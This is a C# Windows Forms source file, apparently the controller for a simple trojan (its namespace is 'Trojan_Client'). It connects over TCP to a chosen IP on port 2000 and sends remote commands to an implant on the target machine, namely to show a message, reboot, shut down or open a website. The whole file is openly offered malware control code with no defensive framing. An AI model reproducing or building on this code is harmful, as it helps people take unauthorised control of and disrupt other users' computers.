﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Trojan_Client__Schöner_
{
    public partial class Form1 : Form
    {
        public static bool IsConnected;
        public static NetworkStream Writer;
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            TcpClient Connector = new TcpClient();
            string IP = textBox1.Text;
            try
            {
                Connector.Connect(IP, 2000);
                IsConnected = true;
                Writer = Connector.GetStream();
                label2.Text = "Connection succesful to: " + IP + ".";
                button2.Enabled = true;
                button3.Enabled = true;
                button4.Enabled = true;
                button5.Enabled = true;
            }
            catch
            {
                MessageBox.Show("Error while Connecting", "Error");
                textBox1.Text = "";
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string input = Microsoft.VisualBasic.Interaction.InputBox("What do you like to send?");
            if (input != "") {
                SendCommand("MESSAGE!!!!---" + input);
            }
            else
            {
                MessageBox.Show("Canceld", "Error");
            }
        }
        public static void SendCommand(string Command)
        {
            try
            {
                byte[] Packet = Encoding.ASCII.GetBytes(Command);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch
            {
                IsConnected = false;
                Writer.Close();
            }

        }

        private void button4_Click(object sender, EventArgs e)
        {
            string input = Microsoft.VisualBasic.Interaction.InputBox("Time until Restart?");
            if (input != "")
            {
                SendCommand("REBOOT!!!!---" + input);
            }
            else
            {
                MessageBox.Show("Canceld", "Error");
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            string input = Microsoft.VisualBasic.Interaction.InputBox("Time until Shutdown?");
           if (input != "")
            {
                SendCommand("SHUTDOWN!!!!---" + input);
            }
            else
            {
                MessageBox.Show("Canceld", "Error");
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string input = Microsoft.VisualBasic.Interaction.InputBox("What Site do you want to Open?");
            if (input != "")
            {
                SendCommand("OPENSITE!!!!---" + input);
            }
            else
            {
                MessageBox.Show("Canceld", "Error");
            }
        }
    }

    }